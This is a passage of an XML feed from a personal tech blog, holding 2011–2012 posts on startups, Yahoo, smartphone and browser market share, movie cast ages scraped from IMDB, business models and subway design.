   <title>In Defense of Yahoo</title>
   <link href="http://dangoldin.com/2012/08/05/in-defense-of-yahoo/"/>
   <updated>2012-08-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/08/05/in-defense-of-yahoo</id>
   <content:encoded><![CDATA[<p><span><img height="220" src="http://www.personalbrandingblog.com/wp-content/uploads/2010/05/yahoologo.jpg" width="840" />Reading recent tech coverage makes you think that each newly startup is more valuable than Yahoo. Yahoo is the 4th most visited site in the world with over 300 million users on Yahoo mail. This is a problem every startup should hope to have.</span><br /><span></span><br /><span>User acquisition is the most difficult task for a consumer startup. User attrition is an easier problem to solve than user acquisition. Yahoo doesn’t need to build a product that’s 10 times better than the competition, they just need to simplify and improve what they already have. Yahoo also has massive usage among the mass market with millions of people having Yahoo as their home page. These are not the same people that sign up for every startup featured on TechCrunch. Yahoo has challenges but worrying about user acquisition is not one of them. Yahoo will need to develop a vision and relentlessly pursue it. The culture will need to change and vested interests will need to be broken.</span><br /><span></span><br /><span>It’s easy to criticize Yahoo for ignoring Google and Facebook but impossible to say what Yahoo should be doing now. I look forward to seeing what happens to Yahoo with Marissa Mayer at the helm.</span></p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The Startup Advantage - Details, Details, Details</title>
   <link href="http://dangoldin.com/2012/07/28/the-startup-advantage-details-details-details/"/>
   <updated>2012-07-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/07/28/the-startup-advantage-details-details-details</id>
   <content:encoded><![CDATA[<div><img src="http://media.tumblr.com/tumblr_m7vxx4vhKa1qz9esq.png" /></div>

<p>A frustration I’ve been experiencing more and more is having to reload a webpage in order to change the date range in the options. If a company expects me to keep a site open for more than a day they should make it easy for me to update the options. The big example is Google Analytics - I open up a page, choose a date range, and get to see my charts. If I keep the tab open and want to want to run the same analysis the next day, I’m forced to reload the page to even be able to include today in the date range. It’s an unnecessary action for the user and it would be easy to correct this behavior with some simple Javascript.</p>

<p>Such small details don’t matter individually but together they reflect a lack of empathy for the user that impacts a company culture. We should always be striving to make a user’s experience better and doubly so whenever it’s actually an easy fix. Other easily fixable examples I’ve seen are clearing entire forms when there’s an error with one field and not highlighting the field that’s giving the error.</p>

<p>I suspect the reason these aren’t fixed is a managerial problem. The application works and there’s no reason to go back when there are all sorts of new shiny things that can be built. No one wants to do a cost vs value analysis for these minor fixes so they stay the way they are. I suppose you need to either build things the right way immediately, fix it without letting anyone know, or resign to leaving it alone.</p>

<p>There’s a reason startups tend to have better products. They don’t go through analyses to determine whether to make minor changes, all it takes is for someone to decide that something needs to be fixed and the next deployment, probably within a few hours, will have it solved. Combined with the massive sense of ownership that comes with working at a startup, that’s a lot of improvements that would be done at a startup but not a larger company.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Race to 0 - RIM vs IE</title>
   <link href="http://dangoldin.com/2012/07/10/race-to-0-rim-vs-ie/"/>
   <updated>2012-07-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/07/10/race-to-0-rim-vs-ie</id>
   <content:encoded><![CDATA[<p>I read an <a href="http://www.bloomberg.com/news/2012-07-09/rim-s-customers-working-on-contingency-plans-corporate-canada.html" target="_blank">article</a> earlier today about how companies are preparing for a possible demise of RIM and couldn’t help but compare RIM’s decline over only a few years compared to how long it’s taking IE to disappear.</p>

<p>To confirm that there is in fact a difference in behavior, we can compare the RIM share among smartphones and IE share among browsers. Turns out that they are noticeably different: IE is on a linear decline with close to 70% in Q3 2008 but around 36% in Q1 2012 while RIM starts at 16% in Q3 2008, goes up to a high of 21% in 2009 and then drops to 7% in Q1 2012. Plotting their % decline since the data starting point highlights this further. If we calculate the average decline per quarter from their highest levels and try to see how long it will take to hit 0% share, IE will take almost 4 years while RIM will take less than 5 quarters.</p>

<img src="https://docs.google.com/spreadsheet/oimg?key=0AqnEN-X663bKdDJsZW9ZRnRHRmJfY0R4V3k5eHUzR1E&amp;oid=4&amp;zx=nigests5c38n" width="600" height="371" layout="responsive"/>

<img src="https://docs.google.com/spreadsheet/oimg?key=0AqnEN-X663bKdDJsZW9ZRnRHRmJfY0R4V3k5eHUzR1E&amp;oid=5&amp;zx=o71u3wfjfzwp" width="600" height="371" layout="responsive"/>

<p>Why are they so different? If they’re both in the enterprise why don’t we see a similar decline in both? I was able to think of a few reasons but would love to hear what others think.</p>

<ul>
  <li>RIM’s competition has been much stronger - both Apple and Android have been eating up the share at a massive rate while the browser market has been relatively stable. This is compounded by smartphones being a new, quickly evolving industry where people are upgrading phones as frequently as they can.</li>
  <li>Guy Kawasaki says that companies should focus on making their product <a href="http://www.success.com/articles/1112-the-evangelist-s-playbook" target="_blank">10 times better</a> than the existing competition in order to get adoption. This may be a lot easier to accomplish with smartphones than with browsers.</li>
  <li>Browsers are an older industry and there’s no point in even doing this comparison. We should do this analysis when the smartphone market is more mature and we can normalize the two time frames.</li>
</ul>

<p>I tried digging in a bit further but it’s unfortunate how difficult it is to find browser market share data. I’d love to dive in and look at the trend in the browser market since the 1990s and see how that compares to the trend in smartphones. If anyone has this data please let me know.</p>

<p>Here’s the <a href="https://docs.google.com/spreadsheet/ccc?key=0AqnEN-X663bKdDJsZW9ZRnRHRmJfY0R4V3k5eHUzR1E" target="_blank">Google spreadsheet</a> if you want to play around with the data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Photo taken near Times Square</title>
   <link href="http://dangoldin.com/2012/07/09/photo-taken-near-times-square/"/>
   <updated>2012-07-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/07/09/photo-taken-near-times-square</id>
   <content:encoded><![CDATA[<img src="http://dangoldin.com/assets/static/images/times-square-poster.jpg" width="500" height="667" layout="responsive" alt="Time square poster"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Achieving browser autocomplete</title>
   <link href="http://dangoldin.com/2012/06/07/achieving-browser-autocomplete/"/>
   <updated>2012-06-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/06/07/achieving-browser-autocomplete</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/autocomplete.png" width="500" height="89" layout="responsive"/>

<p>Over the past few days, I’ve been thinking about habits. How do they form? How do they change? And the selfish one - how can you build a product that is habit forming? My cofunder sent me a great Nir &amp; Far <a href="http://www.nirandfar.com/2012/03/how-to-manufacture-desire.html">blog post</a> that goes into detail about generating desire which is a great read to anyone building a consumer product.</p>

<p>Along these lines, I decided to be a bit introspective and see which products and sites are a part of my habit. A simple way was to type each letter of the alphabet into the Google Chrome address bar and see what site autocompletes. Here goes:</p>

<ul>
  <li>analytics.google.com</li>
  <li>bankofamerica.com</li>
  <li>cad-comic.com/cad</li>
  <li>docs.google.com</li>
  <li>eventbrite.com</li>
  <li>facebook.com</li>
  <li>glos.si</li>
  <li>heroku.com</li>
  <li>instapaper.com</li>
  <li>joinblended.com</li>
  <li>klout.com</li>
  <li>linkedin.com</li>
  <li>maps.google.com</li>
  <li>news.ycombinator.com</li>
  <li>optimum.com</li>
  <li>plus.google.com</li>
  <li>questionablecontent.net</li>
  <li>reader.google.com</li>
  <li>startupmullings.com</li>
  <li>twitter.com</li>
  <li>udacity.com</li>
  <li>voice.google.com</li>
  <li>wixlounge.com</li>
  <li>xkcd.com</li>
  <li>youtube.com</li>
  <li>zerply.com</li>
</ul>

<p>After excluding my sites (glos.si and startupmullings.com), we can organize them into the following categories:</p>

<ul>
  <li>Entertainment (the comic sites - xkcd, QC, CAD; Youtube; Google Reader)</li>
  <li>Social Networks (Facebook, LinkedIn, Google Plus, Twitter)</li>
  <li>Utilities (Google analytics/docs/voice, Bank of America, Instapaper, Eventbrite, Optimum, Heroku)</li>
  <li>The rare letters (Zerply, Udacity, Wix Lounge). I’d like to include Klout on this list rather than admit to browsing it but I don’t know if that will be believable.</li>
</ul>

<p>Every consumer site should strive to get to browser autocomplete status for some users rather than being semi-popular to more users. Being useful to a few passionate users and growing with their help is a much better approach than trying to immediately appeal to the mass market.</p>

<p>And although this exercise may be embarrassing, I’d love to see what others have as their 26 sites.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Trend of actor vs actress age differences</title>
   <link href="http://dangoldin.com/2012/05/23/trend-of-actor-vs-actress-age-differences/"/>
   <updated>2012-05-23T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/05/23/trend-of-actor-vs-actress-age-differences</id>
   <content:encoded><![CDATA[<p>I recently watched <a href="http://www.missrepresentation.org/" title="Miss Representation" target="_blank">Miss Representation</a> which documents how the portrayal of women in the media affects women’s roles in society. It raised many interesting points and definitely got me thinking. If you haven’t seen it already you should definitely check it out. One of the points was that there’s a huge pressure to cast female roles with young actresses whereas it doesn’t matter so much for the male. I was sure this was true but I wanted to see how big of a deal it actually was, take a coding break, and play around with some data. The goal was to replicate the results as well as provide some tools for others to do similar analyses.<br /><br />I took a quick look at the IMDB site and realized that they did not have an API available. I looked at a few open source alternatives but they all seemed like overkill for what I wanted to do so I decided to just write a quick Python script to scrape the pages I needed. I started by pulling the top 50 movies for each decade (via <a href="http://www.imdb.com/chart/1910s"><span><a href="http://www.imdb.com/chart/1910s">http://www.imdb.com/chart/1910s</a></span></a> - <a href="http://www.imdb.com/chart/2010s)"><span><a href="http://www.imdb.com/chart/2010s">http://www.imdb.com/chart/2010s</a>)</span></a> and then pulling the top 5 cast members for each movie (via <a href="http://www.imdb.com/title/tt1375666/fullcredits#cast)"><span><a href="http://www.imdb.com/title/tt1375666/fullcredits#cast">http://www.imdb.com/title/tt1375666/fullcredits#cast</a>)</span></a>. I had to actually look at the actor/actress pages as well in order to pull the birth dates as well as the sex. After loading this data into a database it was a very simple query to run the analysis and then <a href="https://docs.google.com/spreadsheet/ccc?key=0AqnEN-X663bKdGsxdFV4RTlQM21SdW9QRFBqVEVsaUE" target="_blank">Google Spreadsheets</a> to clean it up. <br /><br />Not surprisingly, it turns out that over the past 11 decades, the average actor is 41 while the average actress is 32. Interestingly, during the 1980s they were almost the same but the gap has been widening since then.</p>

<p><a href="https://docs.google.com/spreadsheet/ccc?key=0AqnEN-X663bKdGsxdFV4RTlQM21SdW9QRFBqVEVsaUE"><img src="https://docs.google.com/spreadsheet/oimg?key=0AqnEN-X663bKdGsxdFV4RTlQM21SdW9QRFBqVEVsaUE&amp;oid=2&amp;zx=epfykigr9wiq" width="600" height="371"/></a></p>

<p>I may be a bit late to the “<a href="http://www.codinghorror.com/blog/2012/05/please-dont-learn-to-code.html" target="_blank">Don’t learn to code</a>” debate but I think this illustrates that coding is a pretty useful skill to have. It’s not about being able to develop enterprise applications but more about automating some work and being able to scratch a curiosity itch. If this data were publicly available and everyone had the tools and abilities to do these types of analyses I believe we’d be in much better shape. Maybe someone can take the work I started and leverage it to discover something new.</p>

<p><span></span><br /><span>Note: The code to scrape IMDB is posted on <a href="https://github.com/dangoldin/imdb" target="_blank">github</a> but note that it’s definitely crude and hackish at times. My goal was to get the analysis done as quickly as possible so I didn’t spend too much time refactoring.</span></p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Selling to the enterprise? Target the consumer</title>
   <link href="http://dangoldin.com/2012/05/22/selling-to-the-enterprise-target-the-consumer/"/>
   <updated>2012-05-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/05/22/selling-to-the-enterprise-target-the-consumer</id>
   <content:encoded><![CDATA[<p>A trend I’ve been noticing more and more is enterprise sales being done bottoms up. The typical approach is to offer a free trials or have some sort of freemium product. Each sign up is then treated as an inbound lead that is assigned an account manager. Within two weeks of signing up for New Relic I was contacted by an account manager who helped answer my questions and helped me get New Relic set up for Glossi. Working with him, we were able to get a longer trial period and a discounted price for when we’re ready to upgrade. <a href="http://blog.hubspot.com/blog/tabid/6307/bid/31555/Inbound-Leads-Cost-61-Less-Than-Outbound-New-Data.aspx" target="_blank">HubSpot found</a> that inbound leads cost 61% less than outbound leads. If having a strong SEO and Social Media presence drops acquisition costs that much imagine the drop caused by having a usable product. Although we’re a small, scrappy startup that’s quick to try new products and services, I believe this approach will become the standard way of selling SAAS in the enterprise. It’s much easier to get a person to try something new and if you can turn him into a fan, you’re one step closer to getting the company signed up.</p>

<p>An extreme case of this would be to initially build a product that’s focused on the consumer and only building out enterprise features when there’s a clear demand for them. A great example would be Dropbox, they initially focused exclusively on making a kick-ass experience for the consumer and only after nailing that down did they release the “<a href="https://www.dropbox.com/teams" target="_blank">Dropbox for Teams</a>” plans. I don’t recall the history of <a href="https://github.com/" target="_blank">GitHub</a> but they may have done something similar - initially focusing on public and private repositories and then growing into the more enterprise friendly plans. This is a great approach for a product driven startup since you can focus on building your product without getting stuck in the twisted path of custom client work. But when your product and team are more fleshed out, you can focus on the additional revenue opportunities created by going after the enterprise.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Peter Thiel's CS183</title>
   <link href="http://dangoldin.com/2012/05/16/peter-thiels-cs183/"/>
   <updated>2012-05-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/05/16/peter-thiels-cs183</id>
   <content:encoded><![CDATA[<p>A great blog I’ve recently started following is <a href="http://blakemasters.tumblr.com/peter-thiels-cs183-startup" title="Peter Thiel's CS 183 by Blake Masters" target="_blank">Blake Master’s notes</a> from Stanford’s CS183 class being taught by Peter Thiel. Peter provides an insightful view of the tech startup world that is valuable to anyone interested in startups and entrepreneurship.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Growth of Consumer Comfort with Technology</title>
   <link href="http://dangoldin.com/2012/04/25/growth-of-consumer-comfort-with-technology/"/>
   <updated>2012-04-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/04/25/growth-of-consumer-comfort-with-technology</id>
   <content:encoded><![CDATA[<p>In a <a href="http://startupmullings.com/post/20825836395/future-of-startups-small-teams-big-profits" title="Future of Startups: Small Teams, Big Profit" target="_blank">previous post</a>, I discussed the factors that allow small teams to create products that can be exposed to millions of users within a few months. In this post, I want to take a deeper look into why consumers are so much more comfortable with technology now compared to 20 years ago and try to see where this leads. Since customers are what cause our businesses to grow, we need to be cognizant of what drives their behavior in order to plan for the future. Wayne Gretzky’s father famously said “A good hockey player plays where the puck is. A great hockey player plays where the puck is going to be” and I’m hopeful that we’ll be able to see where the consumer puck is going to be.<br /><br />To me, the major driver is <a href="http://en.wikipedia.org/wiki/Moore's_law" title="Moore's Law" target="_blank">Moore’s Law</a>. We’ve seen computation speeds double every 18 months for the past 50 years. This has obviously led to faster computers but has also led to exponentially reducing costs. This has been a huge economic driver and is allowing computers to be more accessible than ever. Our cellphones are more powerful than what was used to land on the moon. These increases in computation also led to the rise of the modern web. It went from being a military/academic project that dealt with text data to something that’s distributing pictures and videos to whoever is interested.<br /><br />More importantly, improvements in computation led to improvements in usability. Even if we had modern browser standards like CSS3 and HTML5 in the 1990s our computers would be too weak to handle them. We would not have any of the modern innovations (AJAX, DOM manipulation) and our web pages would be static without any rich media content. If we never got past the command line, how many people would have computers in their home? How many smartphones would exist? I’d argue that the usability improvements are what led to the massive consumer adoption of tech products. Of course, computation, cost, and usability are all intertwined but computation and cost alone would not have led to the consumer adoption we’ve seen.<br /><br />What does this mean for the future? I see usability becoming even more native with us not realizing that we’re even using a computer. We’re already seeing this emerging with Siri and Google Glasses. As long as our computation speeds continue to improve these technologies will become better and better and will recede more and more into the background. Of course, this is all dependent on Moore’s Law holding, with many saying the pace will decrease by 2020. I’m optimistic that we’ll come up with something but even if we don’t, as long as we computing costs keep on dropping, via <a href="http://en.wikipedia.org/wiki/Koomey's_law" title="Koomey's Law" target="_blank">Koomey’s Law</a>, we should still see the benefits as we move more and more computation to the ever cheaper cloud. It’s difficult to imagine what would happen if our computation speeds stop increasing the way they have been over the past 50 years.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Draw Something Zyngafied</title>
   <link href="http://dangoldin.com/2012/04/12/draw-something-zynafied/"/>
   <updated>2012-04-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/04/12/draw-something-zynafied</id>
   <content:encoded><![CDATA[<p>We’re aware of Zynga’s purchase of Draw Something and Zynga’s emphasis on analytics and metrics to drive product features and decisions. I’m a bit late to the party but I tried brainstorming to put together  a Zyngafied version of Draw Something:<strong><br /></strong></p>

<ul class="bulleted">
    <li><span>Favor drawings that require colors that a user does not have to encourage the user to buy new colors.</span></li>

<li><span>Leverage the priming effect by picking words that will encourage users to spend more. For example using the words “gold”, “coin”, and “rich” would put users in a buying mood.</span></li>

<li><span>Charge more for the more popular color packs.</span></li>

<li><span>Include “limited edition” color and word packs.</span></li>

<li><span>Reward active users with free color packs, bombs, etc.</span></li>

</ul>

<p>I, for one, am glad that I got to play Draw Something before it turns into this money extraction machine.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Future of Startups - Small Teams, Big Profit</title>
   <link href="http://dangoldin.com/2012/04/10/future-of-startups-small-teams-big-profit/"/>
   <updated>2012-04-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/04/10/future-of-startups-small-teams-big-profit</id>
   <content:encoded><![CDATA[<p>The big news today was that Facebook acquired Instagram for $1B in cash and stock. I don’t want to debate whether that was a good price but I am amazed that Instagram was able to get to over 30 million users with 13 employees, of which 3 are engineers. I see a few factors combining to make this an ideal model for the future tech startup.</p>

<ul class="bulleted">
    <li>Open source tools and the cloud have made starting easier than ever and a few motivated, talented people can build a marketable product over a weekend.</li>

<li>Social networks simplify distribution and allow a good product to stand out and succeed without heavy marketing.</li>

<li>People are comfortable with technology and can start using a product without any dedicated support.</li>

</ul>

<p>They are converging to provide a massive increase in leverage. A small team is able to quickly and cheaply build a product that can spread organically to millions of users. The enterprise space will also be impacted as people start expecting their personal tools in their corporate environments. It’s definitely an exciting time to be building a tech startup.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On Writing</title>
   <link href="http://dangoldin.com/2012/04/04/on-writing/"/>
   <updated>2012-04-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/04/04/on-writing</id>
   <content:encoded><![CDATA[<p><span>I recently made an effort to improve my writing and this blog gives me a great way to practice. I force myself to write at least two posts a week, even if it’s just a paragraph. Writing hasn’t come easy to me and I spent more than 20 years returning the favor. In high school, I rarely edited and a quick spell and grammar check was good enough for me. In college, I avoided the writing-heavy classes and the ones I did take I just followed my high school approach. Something changed when I started working. Although initially driven by my desire to perform, I started seeing writing as a challenging, creative process. I remember spending 30 minutes on a paragraph-long email before being comfortable enough to send it out. Even after only a few weeks, I feel that my writing has gotten better - both in terms of speed and clarity. I still have trouble writing long posts since I tend to go on tangents and lose focus.</span><br /><span></span><br /><span>An issue I’m currently dealing with is deciding when something is “done.” I could always spend more time editing and rewriting but should I? How much editing is a good use of my time? Jack Kerouac wrote the first draft of On The Road in three weeks and the final draft in 20 days. On the other hand, T. S. Eliot wrote The Waste Land over a few years, with the drafts being almost twice as long. I fall somewhere in between. I realize that I learn better through struggle and forcing myself to edit and rewrite helps me in the long term. At the same time, I realize that I have a ton of other things to do and rewriting the same paragraph a dozen times is not the best use of my time. At the moment, I write and rewrite until I’m proud of what I have and hope that it will get easier in the future. As frustrating as it can get, it’s significantly easier than what people were doing only 20 years ago before computers. This thought helps me focus and slowly work my way up to the fabled 10,000 hours.</span></p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Where are the event recommendation startups?</title>
   <link href="http://dangoldin.com/2012/03/30/where-are-the-event-recommendation-startups/"/>
   <updated>2012-03-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/03/30/where-are-the-event-recommendation-startups</id>
   <content:encoded><![CDATA[<p>A few years ago I worked on a startup with the goal of providing local event recommendations. Unfortunately, we were never able to make it work. We focused too much on building new features, didn’t simplify our product enough, didn’t have a focused vision, and didn’t spend time understanding the market. After reading Mark Hendrickson’s <a href="http://techcrunch.com/2012/01/22/post-mortem-for-plancast/" title="A Post-Mortem for Plancast" target="_blank">Plancast’s postmortem</a>, I started thinking about the problem again and what a successful approach would look like. As Mark pointed out, it’s difficult to incent people to consistently broadcast their plans. Most people will only plan major events in advance and even fewer will log into a website to note that they’re going to grab beers with a friend in a few hours. One thing people are starting to do is checking in to a venue. Knowing the present is a lot simpler than thinking about the future and smartphones have reinforced this behavior. Foursquare has been riding this wave and apps like GroupMe and Fast Society have also taken advantage.</p>

<p>Instead of trying to change user behavior, it’s easier to leverage existing behaviors but apply it to something else. Foursquare is best positioned to move into the event recommendation space. It has already started providing venue recommendations based on historical checkins and there’s value in knowing that 50 people have checked into a stadium within a few minutes of one another. By integrating with an event database, it’s possible to know what events people are attending. This information can initially be used to recommend venues that have similar events going on. Over time, this can transition into doing direct event recommendations.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Overcoming the Build Bias</title>
   <link href="http://dangoldin.com/2012/03/24/overcoming-the-build-bias/"/>
   <updated>2012-03-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/03/24/overcoming-the-build-bias</id>
   <content:encoded><![CDATA[<p>An issue I’ve been trying to overcome is what I like to call the “build bias.” Whenever I’d run into a technical problem, I’d want to solve it on my own - whether it’s by writing some code or by installing and configuring various libraries and packages. I remember the time I needed to collect feedback for a website but instead of just using an off the shelf product like <a href="http://getsatisfaction.com/" title="GetSatisfaction" target="_blank">GetSatisfaction</a>, I decided to create my own. Although I was able to get it working, it took me longer than expected to get it into a usable state and distracted me from the other improvements I wanted to make.<br /><br />As a developer, it’s very easy to convince yourself to build from scratch every time you need something rather than using an existing solution. It’s exciting to work on something new and it’s annoying integrating someone else’s code. It’s even worse when they’re charging a few dollars a month for something that you can build in a few hours.<br /><br />More often than not we underestimate the cost of building something of sufficient quality and don’t include the ongoing maintenance cost we’ll most likely be doing. More importantly, we are no longer focusing on the highest leverage activity. As they teach in business schools, you shouldn’t outsource your core competency but everything else is fair game. This is also supported by the lean startup approach which encourages getting your product to market as soon as possible so you can validate your market hypotheses. Why spend time building features when you don’t even know you have a marketable product? If it does turn out that you have a successful product you can always go back and develop your own solution then.<br /><br />My new process is to first make sure that the feature is even needed. If it is, I check out the open source alternatives to see if anything can be used. If not, I look at the available paid solutions. For many small projects, it turns out that you can ride the trial/basic version enough to validate your idea. This approach has led <a href="http://www.glos.si" title="Glossi" target="_blank">Glossi</a> to use <a href="https://mongohq.com/home" title="MongoHQ" target="_blank">MongoHQ</a> to host my database, <a href="http://sendgrid.com/" title="SendGrid" target="_blank">SendGrid</a> as my email system, and <a href="http://getsatisfaction.com/" title="GetSatisfaction" target="_blank">GetSatisfaction</a> as a feedback widget in addition to ton of open source libraries. With every new project, I’m offloading more and more of my auxiliary features to cloud based services and feel much more productive. Makes me wonder how many other services there are out there that can be leveraged.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>When is it time to leave the full time job?</title>
   <link href="http://dangoldin.com/2012/03/21/when-is-it-time-to-leave-the-full-time-job/"/>
   <updated>2012-03-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2012/03/21/when-is-it-time-to-leave-the-full-time-job</id>
   <content:encoded><![CDATA[<p>A common question I get when telling my friends that I’m leaving my full time job to work on Glossi is “Why now? Why not continue working on it nights and weekends?” It’s a fair question - we’ve been working on Glossi for 6 months of nights and weekends and made significant progress. Why not keep doing that and have the best of both worlds?</p>

<p>Everyone has their own reasons but for me it was more of a gut feeling that it was the right time. I had the following thoughts in mind but I didn’t sit down to make a list of pros and cons:</p>

<ul class="bulleted">
    <li>We’re at the stage where the next steps cannot be done on nights and weekends. The coding is no longer the highest priority work and we now have to worry about business development and trying to raise funding. Neither of those can be done easily or efficiently on nights and weekends.</li>

    <li>We’re close to finding our product-market fit and we want to get there as quickly as we can.</li>

    <li>We felt as if the market is getting more competitive and we need to focus or be left behind. This may be especially true in the tech space where everything moves so quickly.</li>

    <li>We realized that our todo list is growing much quicker than our progress through it. I don’t expect this to change but we want to make as much progress as we can.</li>

    <li>I was spending more and more time thinking about Glossi that I was not as committed or focused at work. This was both a disservice to me and the company and I wanted to get out of the way as soon as I stopped being as productive as I should have been.</li>
</ul>

<p>Please share your thoughts  - I’d love to hear other reasons.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>On business models - To collect or to fine?</title>
   <link href="http://dangoldin.com/2012/03/05/on-business-models-to-collect-or-to-fine/"/>
   <updated>2012-03-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/03/05/on-business-models-to-collect-or-to-fine</id>
   <content:encoded><![CDATA[<p>A few years ago, I was on vacation in Italy and spent a good amount of time on trains. Being from the US, I noticed that my ticket was not checked every single ride. At the same time, not having a ticket and being caught carried a large fine. Having the luxury of time, some assumptions, and some algebra, it’s straightforward to work out how to set the fine to make the two systems have the same expected revenue.</p>

<figure class="highlight"><pre><code class="language-txt" data-lang="txt">N = number of passengers
p = ticket price
c = % of passengers that will be checked for a ticket
v = % of passengers that are violators
F = fine

Np = Np(1-c)(1-v) + Npc(1-v) + Ncv*F

Solving for F, we get that F = p/c.</code></pre></figure>

<p>With these assumptions, the fine only depends on the ticket price and the check rate. For example, if the ticket price is $50 and there are 1,000 passengers, the expected amount collected is $50,000. If the conductor only checks 10% of passengers for tickets, the fine would need to be $500 to make the two systems equivalent. If the two systems are expected to generate the same revenue, but one is cheaper to implement, why is the seemingly non-optimal system chosen? I can think of a few reasons:</p>

<ul>
  <li>Checking all tickets is easier than setting the check rate and fine - especially if they fluctuate</li>
  <li>There are additional roles for the ticket collector other than checking tickets</li>
  <li>There’s value in minimizing the volatility of the revenue</li>
  <li>The cost of having conflicts between passengers and collectors over large fines is higher than checking every ticket - there may be a fear of a low-likelihood, high-cost event</li>
  <li>Union agreements may prevent changing the structure</li>
  <li>General cultural differences across continents</li>
</ul>

<p>As entrepreneurs, we’re constantly thinking about the ideal business model. Noticing and comparing other business models help us refine and develop our own.</p>

<p>I’m always on the lookout for more examples, so if you have any please email me or post below.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Shakespeare and Startups</title>
   <link href="http://dangoldin.com/2012/01/29/shakespeare-and-startups/"/>
   <updated>2012-01-29T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/01/29/shakespeare-and-startups</id>
   <content:encoded><![CDATA[<p>I was reading Ben Yagoda&#8217;s book, <a href="http://www.amazon.com/When-You-Catch-Adjective-Kill/dp/0767920775" target="_blank">When You Catch An Adjective; Kill It</a>, when I came across the following passage: &#8220;In Shakespeare&#8217;s day, there were no fancy props, so the text had to do the work of stage settings.&#8221; Although it was referring to starting sentences with conjunctions, it got me thinking about constraints and the way they foster innovation. Startups operate the same way: you don&#8217;t always have the resources to do what you want and are forced to innovate a way out.</p>

<p>Here are some examples:</p>

<ul class="bulleted"><li>Google realized that scaling vertically was significantly more expensive than scaling horizontally using commodity hardware. To achieve this, they had to create the <a href="http://en.wikipedia.org/wiki/Google_File_System" target="_blank">Google File System</a> to deal with the thousands of computers and the frequent hardware failures.</li>

<li>Many computer science algorithms and data structures were created when the CPU speeds were low and memory was lacking. Low CPU speeds led to more efficient graph search algorithms like Djikstra and A*. Limited memory led to the creation of probabilistic data structures like Bloom filters and Skip lists. </li>

<li>The Oakland Athletics baseball team could not compete on salary. But under Billy Beane, they were able to compete by adopting an analytical approach to identify talented, undiscovered baseball players (via <a href="http://www.amazon.com/Moneyball-Art-Winning-Unfair-Game/dp/0393057658" target="_blank">Moneyball</a>).</li>

<li>Even the Lean Startup methodology, which emphasizes rapid prototyping to quickly test market hypotheses, is a way to deal with the limited financial and time constraints that plague startups.</li>

</ul>

<p>We often complain about obstacles while ignoring their impact on innovation. If you have any other examples of innovations caused by constraints, please share.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Improving the Subway User Experience</title>
   <link href="http://dangoldin.com/2012/01/12/improving-the-subway-user-experience/"/>
   <updated>2012-01-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2012/01/12/improving-the-subway-user-experience</id>
   <content:encoded><![CDATA[<img src="nyc-subway.jpg" width="537" height="357" layout="responsive"/>
<p class="caption">Source: <a href="https://inhabitat.com/">inhabitat.com</a></p>

<p>The combination of taking the subway every day and reading design books had me thinking of ways to improve the subway user experience, other than the obvious one of making it cleaner.</p>

<p>One thing that struck me is the feeling you get when you see the train leaving the station. It&#8217;s annoyingly stressful and makes me wonder how long I have to wait until the next train comes. Anything that can avoid this outcome would make waiting for the train a better experience. A way to do this is to limit the sensory feedback provided by seeing and hearing it leave. To avoid seeing the train until the last minute, subway stations can be designed to have stairs that need to be climbed in order to get to the platform. This way, the train and track will be hidden until the platform is reached. Making the train quieter would reduce the noise and prevent you from being aware that a train has left.</p>

<p>Of course, another cheaper and simpler way to deal with this is to just have something to occupy your time when waiting for the next train - that&#8217;s why having an iPad preloaded with ebooks is great.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Screwed if you do, screwed if you don't</title>
   <link href="http://dangoldin.com/2011/12/30/screwed-if-you-dont-screwed-if-you-do/"/>
   <updated>2011-12-30T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2011/12/30/screwed-if-you-dont-screwed-if-you-do</id>
   <content:encoded><![CDATA[<img src="go-daddy-logo.jpg" alt="GoDaddy logo" width="2700" height="886" layout="intrinsic" />

<p>I'm not entirely sure what to think about the GoDaddy/SOPA situation. On one hand, it's great that the online community was able to get GoDaddy to completely reverse their position on SOPA. On the other, it's disappointing that a web company would support it in the first place.</p>

<p>Should we still be penalizing GoDaddy for their initial SOPA support or move on the same way they did? What type of example does this set for other companies? That they will be judged based on their original position and nothing after? Why even reverse your position if the community will behave as before?</p>

